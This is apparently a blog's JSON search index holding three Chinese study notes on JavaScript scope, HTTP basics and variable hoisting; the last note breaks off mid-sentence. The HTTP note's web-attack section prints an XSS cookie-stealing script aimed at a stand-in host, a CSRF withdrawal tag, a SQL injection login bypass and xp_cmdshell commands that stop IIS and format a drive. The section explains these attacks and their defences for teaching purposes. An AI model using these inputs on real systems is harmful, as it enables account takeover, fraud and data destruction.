[{"categories":["JavaScript","学习笔记"],"contents":" 黄金守则第一条 js没有块级作用域（你可以自己闭包或其他方法实现），只有函数级作用域，函数外面的变量函数里面可以找到，函数里面的面找不到。\nvar a = 10; function aaa() { alert(a); } function bbb() { var a = 20; aaa(); } bbb(); // 10  黄金守则第二条 变量的查找是就近原则，去寻找var定义的变量，当就近没有找到的时候就去查找外层。\nfunction aaa() { alert(a); var a=b=10; //相当于 var a = 10; b=10; 此时 b 为全局变量，a 函数 aaa 的只是局部变量 } aaa(); // undefined ----- var变量声明提前（仅仅将声明提前，初始化仍在远处进行） alert(b); // 10 alert(a); // console面板报错 “ReferenceError: a is not defined”  黄金守则第三条 当参数跟局部变量重名时，优先级是等同的。\nvar a = 10; function aaa(a) { alert(a); var a = 20; } aaa(a); // 10 aaa(); // undefined  黄金守则第四条 参数的传递都是按值传递。基本类型的这个值指基本类型值，引用类型的这个值指引用类型的指针。\n变量的情况 var a = 5; var b = a; b +=3; alert(a);//5 var a = [1,2,3]; var b=a; b.push(4); alert(a);//[1,2,3,4];  引用类型变量重新赋值后，会不一样：\nvar a = [1,2,3]; var b=a; b = [1,2,3] // 此处，b被重新赋值了，也就不再指向a了。 b.push(4); alert(a);//[1,2,3];  参数的情况 参数与变量的作用域是相似的：\nvar a = 10; function aaa(a) { a += 3; alert(a); } aaa(a); // 13 alert(a); // 10  var a = [1,2,3]; function aaa(a) { a.push(4); } aaa(a); alert(a); // 1,2,3,4  引用类型参数重新赋值后，会不一样：\nvar a = [1,2,3]; function aaa(a) { a = [1,2,3]; a.push(4); } aaa(a); alert(a); // 1,2,3  最后一个比较怪的 var arry = []; arry[0] = 'a'; arry[1] = 'b'; arry.foo = 'c'; arry['foo'] = 'd'; //不报错 console.log(typeof arry.foo); // step2: string console.log(typeof arry['foo']); // step3: string console.log(arry.foo); // step4: d console.log(arry['foo']); // step5: d console.log(arry.length); // step6: 2 alert(arry); // step1: a,b arry[foo] = 'e'; //报错 ReferenceError: foo is not defined   因为：  数组对象只有一个属性，那就是 lenght (同时，其他普通对象都没有 length 属性)； 数组也是对象； 对象属性的访问方式有两种，. 与 [] ([] 内属性要加 \u0026quot;\u0026quot;)； 个人推断： 数组作为对象的一种，可以对其使用普通对象的所有方法与属性，但不属于数组对象的属性和方法并不会对数组产生实质影响。   参考  js作用域问题一步步透彻理解\u0026mdash;skylar艺璇 javascript 高级程序设计 JS 对象属性访问的2种方式和用途 \u0026gt; 内容：判断一个字符串中出现次数最多的字符，统计这个次数  ","permalink":"http://localhost:8000/public/post/js%E4%BD%9C%E7%94%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3/","tags":["js","作用域"],"title":"Js作用域问题一步一步透彻理解"},{"categories":["网络","搬运整理"],"contents":" 一 、基础概念 Web 基础  HTTP（HyperText Transfer Protocol，超文本传输协议）。 WWW（World Wide Web）的三种技术：HTML、HTTP、URL。 RFC（Request for Comments，征求修正意见书），互联网的设计文档。  URL  URI（Uniform Resource Indentifier，统一资源标识符） URL（Uniform Resource Locator，统一资源定位符） URN（Uniform Resource Name，统一资源名称），例如 urn:isbn:0-486-27557-4 。  URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。\n\n请求和响应报文 1. 请求报文 \n2. 响应报文 \n二、HTTP 方法 客户端发送的 请求报文 第一行为请求行，包含了方法字段。\nGET  获取资源\n 当前网络请求中，绝大部分使用的是 GET 方法。\nPOST  传输实体主体\n POST 主要目的不是获取资源，而是传输存储在内容实体中的数据。\nGET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在内容实体。\nGET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。并且 GET 只支持 ASCII 字符，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。\nGET 和 POST 的另一个区别是，使用 GET 方法，浏览器会把 HTTP Header 和 Data 一并发送出去，服务器响应 200（OK）并返回数据。而使用 POST 方法，浏览器先发送 Header，服务器响应 100（Continue）之后，浏览器再发送 Data，最后服务器响应 200（OK）并返回数据。\nGET /test/demo_form.asp?name1=value1\u0026amp;name2=value2 HTTP/1.1  POST /test/demo_form.asp HTTP/1.1 Host: w3schools.com name1=value1\u0026amp;name2=value2  HEAD  获取报文首部\n 和 GET 方法一样，但是不返回报文实体主体部分。\n主要用于确认 URL 的有效性以及资源更新的日期时间等。\nPUT  上传文件\n 由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。\nPUT /new.html HTTP/1.1 Host: example.com Content-type: text/html Content-length: 16 \u0026lt;p\u0026gt;New File\u0026lt;/p\u0026gt;  PATCH  对资源进行部分修改\n PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。\nPATCH /file.txt HTTP/1.1 Host: www.example.com Content-Type: application/example If-Match: \u0026quot;e0023aa4e\u0026quot; Content-Length: 100 [description of changes]  DELETE  删除文件\n 与 PUT 功能相反，并且同样不带验证机制。\nDELETE /file.html HTTP/1.1  OPTIONS  查询支持的方法\n 查询指定的 URL 能够支持的方法。\n会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。\nCONNECT  要求用隧道协议连接代理\n 要求在与代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。\nCONNECT www.example.com:443 HTTP/1.1  \nTRACE  追踪路径\n 服务器会将通信路径返回给客户端。\n发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。\n通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪），因此更不会去使用它。\n三、HTTP 状态码 服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。\n   状态码 类别 原因短语     1XX Informational（信息性状态码） 接收的请求正在处理   2XX Success（成功状态码） 请求正常处理完毕   3XX Redirection（重定向状态码） 需要进行附加操作以完成请求   4XX Client Error（客户端错误状态码） 服务器无法处理请求   5XX Server Error（服务器错误状态码） 服务器处理请求出错    2XX 成功  200 OK\n 204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。\n 206 Partial Content ：表示客户端进行了范围请求。响应报文包含由 Content-Range 指定范围的实体内容。\n  3XX 重定向  301 Moved Permanently ：永久性重定向\n 302 Found ：临时性重定向\n 303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。\n 注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。\n 304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。\n 307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。\n  4XX 客户端错误  400 Bad Request ：请求报文中存在语法错误。\n 401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。\n 403 Forbidden ：请求被拒绝，服务器端没有必要给出拒绝的详细理由。\n 404 Not Found\n  5XX 服务器错误  500 Internal Server Error ：服务器正在执行请求时发生错误。\n 503 Service Unavilable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。\n  四、HTTP 首部 有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。\n各种首部字段及其含义如下（不需要全记，仅供查阅）：\n通用首部字段    首部字段名 说明     Cache-Control 控制缓存的行为   Connection 控制不再转发给代理的首部字段、管理持久连接   Date 创建报文的日期时间   Pragma 报文指令   Trailer 报文末端的首部一览   Transfer-Encoding 指定报文主体的传输编码方式   Upgrade 升级为其他协议   Via 代理服务器的相关信息   Warning 错误通知    请求首部字段    首部字段名 说明     Accept 用户代理可处理的媒体类型   Accept-Charset 优先的字符集   Accept-Encoding 优先的内容编码   Accept-Language 优先的语言（自然语言）   Authorization Web 认证信息   Expect 期待服务器的特定行为   From 用户的电子邮箱地址   Host 请求资源所在服务器   If-Match 比较实体标记（ETag）   If-Modified-Since 比较资源的更新时间   If-None-Match 比较实体标记（与 If-Match 相反）   If-Range 资源未更新时发送实体 Byte 的范围请求   If-Unmodified-Since 比较资源的更新时间（与 If-Modified-Since 相反）   Max-Forwards 最大传输逐跳数   Proxy-Authorization 代理服务器要求客户端的认证信息   Range 实体的字节范围请求   Referer 对请求中 URI 的原始获取方   TE 传输编码的优先级   User-Agent HTTP 客户端程序的信息    响应首部字段    首部字段名 说明     Accept-Ranges 是否接受字节范围请求   Age 推算资源创建经过时间   ETag 资源的匹配信息   Location 令客户端重定向至指定 URI   Proxy-Authenticate 代理服务器对客户端的认证信息   Retry-After 对再次发起请求的时机要求   Server HTTP 服务器的安装信息   Vary 代理服务器缓存的管理信息   WWW-Authenticate 服务器对客户端的认证信息    实体首部字段    首部字段名 说明     Allow 资源可支持的 HTTP 方法   Content-Encoding 实体主体适用的编码方式   Content-Language 实体主体的自然语言   Content-Length 实体主体的大小   Content-Location 替代对应资源的 URI   Content-MD5 实体主体的报文摘要   Content-Range 实体主体的位置范围   Content-Type 实体主体的媒体类型   Expires 实体主体过期的日期时间   Last-Modified 资源的最后修改日期时间    五、具体应用 Cookie HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。\nCookie 是服务器发送给客户端的数据，该数据会被保存在浏览器中，并且客户端的下一次请求报文会包含该数据。通过 Cookie 可以让服务器知道两个请求是否来自于同一个客户端，从而实现保持登录状态等功能。\n1. 创建过程 服务器发送的响应报文包含 Set-Cookie 字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。\nHTTP/1.0 200 OK Content-type: text/html Set-Cookie: yummy_cookie=choco Set-Cookie: tasty_cookie=strawberry [page content]  客户端之后发送请求时，会从浏览器中读出 Cookie 值，在请求报文中包含 Cookie 字段。\nGET /sample_page.html HTTP/1.1 Host: www.example.org Cookie: yummy_cookie=choco; tasty_cookie=strawberry  2. 分类  会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。 持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。  Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;  3. Set-Cookie | 属性 | 说明 | | :\u0026ndash;: | \u0026ndash; | | NAME=VALUE | 赋予 Cookie 的名称和其值（必需项） | | expires=DATE | Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止） | | path=PATH | 将服务器上的文件目录作为 Cookie 的适用对象（若不指定则默认为文档所在的文件目录） | | domain=域名 | 作为 Cookie 适用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名） | | Secure | 仅在 HTTPs 安全通信时才会发送 Cookie | | HttpOnly | 加以限制，使 Cookie 不能被 JavaScript 脚本访问 |\n4. Session 和 Cookie 区别 Session 是服务器用来跟踪用户的一种手段，每个 Session 都有一个唯一标识：Session ID。当服务器创建了一个 Session 时，给客户端发送的响应报文包含了 Set-Cookie 字段，其中有一个名为 sid 的键值对，这个键值对就是 Session ID。客户端收到后就把 Cookie 保存在浏览器中，并且之后发送的请求报文都包含 Session ID。HTTP 就是通过 Session 和 Cookie 这两种方式一起合作来实现跟踪用户状态的，Session 用于服务器端，Cookie 用于客户端。\n5. 浏览器禁用 Cookie 的情况 会使用 URL 重写技术，在 URL 后面加上 sid=xxx 。\n6. 使用 Cookie 实现用户名和密码的自动填写 网站脚本会自动从保存在浏览器中的 Cookie 读取用户名和密码，从而实现自动填写。\n但是如果 Set-Cookie 指定了 HttpOnly 属性，就无法通过 Javascript 脚本获取 Cookie 信息，这是出于安全性考虑。\n缓存 扩展阅读：透过浏览器看HTTP缓存\n1. 优点  降低服务器的负担； 提高响应速度（缓存资源比服务器上的资源离客户端更近）。  2. 实现方法  让代理服务器进行缓存； 让客户端浏览器进行缓存。  3. Cache-Control 字段 HTTP 通过 Cache-Control 首部字段来控制缓存。\nCache-Control: private, max-age=0, no-cache  4. no-cache 指令 该指令出现在请求报文的 Cache-Control 字段中，表示缓存服务器需要先向原服务器验证缓存资源是否过期；\n该指令出现在响应报文的 Cache-Control 字段中，表示缓存服务器在进行缓存之前需要先验证缓存资源的有效性。\n5. no-store 指令 该指令表示缓存服务器不能对请求或响应的任何一部分进行缓存。\nno-cache 不表示不缓存，而是缓存之前需要先进行验证，no-store 才是不进行缓存。\n6. max-age 指令 该指令出现在请求报文的 Cache-Control 字段中，如果缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。\n该指令出现在响应报文的 Cache-Control 字段中，表示缓存资源在缓存服务器中保存的时间。\nExpires 字段也可以用于告知缓存服务器该资源什么时候会过期。在 HTTP/1.1 中，会优先处理 Cache-Control : max-age 指令；而在 HTTP/1.0 中，Cache-Control : max-age 指令会被忽略掉。\n持久连接 当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。持久连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。\n\n持久连接需要使用 Connection 首部字段进行管理。HTTP/1.1 开始 HTTP 默认是持久化连接的，如果要断开 TCP 连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前默认是非持久化连接的，如果要维持持续连接，需要使用 Connection : Keep-Alive。\n管线化方式 可以同时发送多个请求和响应，而不需要发送一个请求然后等待响应之后再发下一个请求。\n编码 编码（Encoding）主要是为了对实体进行压缩。常用的编码有：gzip、compress、deflate、identity，其中 identity 表示不执行压缩的编码格式。\n分块传输编码 Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。\n多部分对象集合 一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。\n例如，上传多个表单时可以使用如下方式：\nContent-Type: multipart/form-data; boundary=AaB03x --AaB03x Content-Disposition: form-data; name=\u0026quot;submit-name\u0026quot; Larry --AaB03x Content-Disposition: form-data; name=\u0026quot;files\u0026quot;; filename=\u0026quot;file1.txt\u0026quot; Content-Type: text/plain ... contents of file1.txt ... --AaB03x--  范围请求 如果网络出现中断，服务器只发送了一部分数据，范围请求使得客户端能够只请求未发送的那部分数据，从而避免服务器端重新发送所有数据。\n在请求报文首部中添加 Range 字段指定请求的范围，请求成功的话服务器发送 206 Partial Content 状态。\nGET /z4d4kWk.jpg HTTP/1.1 Host: i.imgur.com Range: bytes=0-1023  HTTP/1.1 206 Partial Content Content-Range: bytes 0-1023/146515 Content-Length: 1024 ... (binary content)  内容协商 通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。\n涉及以下首部字段：Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Language。\n虚拟主机 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。\n通信数据转发 1. 代理 代理服务器接受客户端的请求，并且转发给其它服务器。\n使用代理的主要目的是：缓存、网络访问控制以及访问日志记录。\n代理服务器分为正向代理和反向代理两种，用户察觉得到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到。\n\n\n2. 网关 与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。\n3. 隧道 使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。隧道本身不去解析 HTTP 请求。\n六、HTTPs HTTP 有以下安全性问题：\n 使用明文进行通信，内容可能会被窃听； 不验证通信方的身份，通信方的身份有可能遭遇伪装； 无法证明报文的完整性，报文有可能遭篡改。  HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说使用了隧道进行通信。\n通过使用 SSL，HTTPs 具有了加密、认证和完整性保护。\n\n加密 1. 对称密钥加密 Symmetric-Key Encryption，加密的加密和解密使用同一密钥。\n 优点：运算速度快； 缺点：密钥容易被获取。  \n2. 公开密钥加密 Public-Key Encryption，使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。\n 优点：更为安全； 缺点：运算速度慢；  \n3. HTTPs 采用的加密方式 HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥，之后使用对称密钥加密进行通信。（下图中的 Session Key 就是对称密钥）\n\n认证 通过使用 证书 来对通信方进行认证。\n数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。\n进行 HTTPs 通信时，服务器会把证书发送给客户端，客户端取得其中的公开密钥之后，先进行验证，如果验证通过，就可以开始通信。\n\n使用 OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。浏览器在访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。\n完整性 SSL 提供报文摘要功能来验证完整性。\n七、Web 攻击技术 攻击模式 1. 主动攻击 直接攻击服务器，具有代表性的有 SQL 注入和 OS 命令注入。\n2. 被动攻击 设下圈套，让用户发送有攻击代码的 HTTP 请求，用户会泄露 Cookie 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。\n跨站脚本攻击 1. 概念 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。\n例如有一个论坛网站，攻击者可以在上面发表以下内容：\n\u0026lt;script\u0026gt;location.href=\u0026quot;//domain.com/?c=\u0026quot; + document.cookie\u0026lt;/script\u0026gt;  之后该内容可能会被渲染成以下形式：\n\u0026lt;p\u0026gt;\u0026lt;script\u0026gt;location.href=\u0026quot;//domain.com/?c=\u0026quot; + document.cookie\u0026lt;/script\u0026gt;\u0026lt;/p\u0026gt;  另一个用户浏览了含有这个内容的页面将会跳往 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。\n2. 危害  伪造虚假的输入表单骗取个人信息 窃取用户的 Cookie 值 显示伪造的文章或者图片  3. 防范手段 （一）过滤特殊字符\n许多语言都提供了对 HTML 的过滤：\n PHP 的 htmlentities() 或是 htmlspecialchars()。 Python 的 cgi.escape()。 Java 的 xssprotect (Open Source Library)。 Node.js 的 node-validator。  （二）指定 HTTP 的 Content-Type\n通过这种方式，可以避免内容被当成 HTML 解析，比如 PHP 语言可以使用以下代码：\n\u0026lt;?php header('Content-Type: text/javascript; charset=utf-8'); ?\u0026gt;  跨站点请求伪造 1. 概念 跨站点请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。\nXSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。\n假如一家银行用以执行转账操作的 URL 地址如下：\nhttp://www.examplebank.com/withdraw?account=AccoutName\u0026amp;amount=1000\u0026amp;for=PayeeName。  那么，一个恶意攻击者可以在另一个网站上放置如下代码：\n\u0026lt;img src=\u0026quot;http://www.examplebank.com/withdraw?account=Alice\u0026amp;amount=1000\u0026amp;for=Badman\u0026quot;\u0026gt;。  如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。\n这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。\n透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。\n2. 防范手段 （一）检查 Referer 字段\nHTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。\n这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。\n（二）添加校验 Token\n由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 token 的值为空或者错误，拒绝这个可疑请求。\nSQL 注入攻击 1. 概念 服务器上的数据库运行非法的 SQL 语句。\n2. 攻击原理 例如一个网站登录验证的 SQL 查询代码为：\nstrSQL = \u0026quot;SELECT * FROM users WHERE (name = '\u0026quot; + userName + \u0026quot;') and (pw = '\u0026quot;+ passWord +\u0026quot;');\u0026quot;  如果填入以下内容：\nuserName = \u0026quot;1' OR '1'='1\u0026quot;; passWord = \u0026quot;1' OR '1'='1\u0026quot;;  那么 SQL 查询字符串为：\nstrSQL = \u0026quot;SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');\u0026quot;  此时无需验证通过就能执行以下查询：\nstrSQL = \u0026quot;SELECT * FROM users;\u0026quot;  3. 危害  数据表中的数据外泄，例如个人机密数据，账户数据，密码等。 数据结构被黑客探知，得以做进一步攻击（例如 SELECT * FROM sys.tables）。 数据库服务器被攻击，系统管理员账户被窜改（例如 ALTER LOGIN sa WITH PASSWORD=\u0026lsquo;xxxxxx\u0026rsquo;）。 获取系统较高权限后，有可能得以在网页加入恶意链接、恶意代码以及 XSS 等。 经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如 xp_cmdshell \u0026ldquo;net stop iisadmin\u0026rdquo; 可停止服务器的 IIS 服务）。 破坏硬盘数据，瘫痪全系统（例如 xp_cmdshell \u0026ldquo;FORMAT C:\u0026ldquo;）。  4. 防范手段  在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。 在组合 SQL 字符串时，先针对所传入的参数作字符取代（将单引号字符取代为连续 2 个单引号字符）。 如果使用 PHP 开发网页程序的话，亦可打开 PHP 的魔术引号（Magic quote）功能（自动将所有的网页传入参数，将单引号字符取代为连续 2 个单引号字符）。 其他，使用其他更安全的方式连接 SQL 数据库。例如已修正过 SQL 注入问题的数据库连接组件，例如 ASP.NET 的 SqlDataSource 对象或是 LINQ to SQL。 使用 SQL 防注入系统。  拒绝服务攻击 1. 概念 （denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。\n（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。\n 维基百科：拒绝服务攻击\n 八、各版本比较 HTTP/1.0 与 HTTP/1.1 的区别 HTTP/1.1 新增了以下内容：\n 默认为长连接； 提供了范围请求功能； 提供了虚拟主机的功能； 多了一些缓存处理字段； 多了一些状态码。  HTTP/1.1 与 HTTP/2.0 的区别 1. 多路复用 HTTP/2.0 使用多路复用技术，使用同一个 TCP 连接来处理多个请求。\n2. 首部压缩 HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求通讯双方各自缓存一份首部字段表，从而避免了重复传输。\n3. 服务端推送 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 index.html 页面，服务端就把 index.js 一起发给客户端。\n4. 二进制格式 HTTP/1.1 的解析是基于文本的，而 HTTP/2.0 采用二进制格式。\n参考资料  上野宣. 图解 HTTP[M]. Ren min you dian chu ban she, 2014. MDN : HTTP Are http:// and www really necessary? HTTP (HyperText Transfer Protocol) Web-VPN: Secure Proxies with SPDY \u0026amp; Chrome File:HTTP persistent connection.svg Proxy server What Is This HTTPS/SSL Thing And Why Should You Care? What is SSL Offloading? Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption An Introduction to Mutual SSL Authentication The Difference Between URLs and URIs 维基百科：跨站脚本 维基百科：SQL 注入攻击 维基百科：跨站点请求伪造 维基百科：拒绝服务攻击 What is the difference between a URI, a URL and a URN?  原博主相关扩展阅读  Linux SQL MySQL 正则表达式  ","permalink":"http://localhost:8000/public/post/http%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3/","tags":["http","正则表达式","MySQL","Linux"],"title":"Http协议相关"},{"categories":["",""],"contents":" 提到 JS 中声明变量的方式，必然提及var、let、const、function 四个关键词，其中 var、function 声明的变量会发生变量提升。\nvar var 是初学者常用的声明变量的方式，简单的，声明任何数据都可以用 var :\nvar num = 1；// declare a number var str = ''; // declare a string var bool = true； // declare a boolean var arr = []; // declare a array var obj = {}; // declare a object var fn = function (){}; // declare a function  以上声明变量的方式避免不了会发生变量提升，什么意思呢？以正常的思维来看，如果一个变量还未声明，那么该变量就不可用。但是 JS 中使用 var 声明的变量会发生提升，即 JS 引擎在解释语句时，遇到 var 声明的变量会把该变量放置于当前作用域的最前面，同时初始化为 undefined，且函数的提升在变量之前。举例：\ngetA(); var a = 1; function getA(){ console.log(a); } // print undefined  为什么会打印出 undefined 呢？因为 a 发生了变量提升，且在 a 被赋值之前就使用了 a，此时 a 的值为 undefined，该段代码执行时的实际情形如下：\nfunction getA(){ console.log(a); } var a; // initialize 'a' to 'undefined' getA(); // print undefined a = 1; // then a is assigned to 1  再来看下面的一种情况：\nvar a = 1; function getA(){ console.log(a); var a = 2; console.log(a); } getA(); // first print out undefined, then print out 2  那么上面的代码执行时的实际情形如下：\nfunction getA(){ var a; // initialize a to undefined console.log(a); // then print out undefined a = 2; // a is assigned to 2 console.log(a); // then print out 2 } var a; // this 'a' is global variable a = 1; // global a is assigned to 1 getA();  上段代码中第一次打印出的为什么不是 1 呢？如果不清楚变量提升以及作用域那么很容易犯这种低级错误。上段代码在执行时， getA 函数中首先将 var a 提升至 当前作用域 的最前面，即 getA 函数中的最前面。代码在执行时如何取值呢？当然是先看自己当前作用域有没有该值，如果有，就用当前作用域的值，如果没有，则顺着作用域链向上找，直到找到该变量为止。如何让上段代码输出 1 以及 2 该怎么办呢？很简单，去掉 getA 函数中的 var 即可。\nvar a = 1; function getA(){ console.log(a); // print out global a's value: 1 a = 2; // global a is assigned to 2 console.log(a); // print out global a's value: 2 } getA(); console.log(a); // print out global a's value: 2  因为 getA 函数中没有 a，则顺着作用域链向上找，发现函数外有一个 a 变量，则打印出该变量中存储的值 1 ，此时打印出的 a 是函数外部的 a，再执行 a = 2 时，全局的 a 被赋值为 2。\n那么问题来了：声明变量不加关键字一定会声明为全局变量吗？\n答：如果函数外部没有同名的全局变量的话，那么就会生成全局变量。\n举例一：\nfunction getA(){ console.log(a); // error: a is not defined a = 1; // a is declared to global variable } getA(); console.log(a); // print out 1  第一次打印出 a 时，函数内部没有声明的变量 a，顺着作用域链找也没有 a，就会抛出错误，第二次打印出 a 的时候，函数 getA 中声明了全局变量 a，会打印出 1。当然上述代码抛出错误之后，后面的语句不会执行，可以注释掉 getA 函数中的第一条语句再运行。\n举例二：\na = 1; function getA(){ console.log(a); // print 1 a = 2; // global a is assigned to 2 } getA(); console.log(a); // print out 2  上段代码中，getA 函数外部有一个全局变量 a，getA 中要声明与全局变量同名的变量时没有加变量关键字，因此 a = 2 的作用为将全局变量 a 赋值为 2。因此可以看出，声明变量时一定要加上变量关键字，否则会产生预料之外的错误。\n如果一个变量没有定义就可以使用，是非常令人困惑的。针对这种情况，ES6 推出了声明变量的新关键字 let 以及 const 。\nlet let 关键字声明的变量是不会发生变量提升的，将之前的代码中的 var 改为 let 看看结果：\ngetA(); let a = 1; function getA(){ console.log(a); // error: a is not defined }  上面的代码执行实际情况为：\nfunction getA(){ console.log(a); } getA(); // error: a is not defined let a; // initialize a to undefined a = 1; // then a is assigned to 1  在函数内部用 let 声明变量是一样的。\nlet a = 1; function getA(){ console.log(a); // error: a is not defined let a = 2; console.log(a); // print out 2 } getA();  上段代码也很好理解，关键是要理解作用域。\n那么如果上段代码中想要先打印出函数外 a 的值，再声明函数内部的私有变量 a 可以吗？\n答案是不可以，因为 let 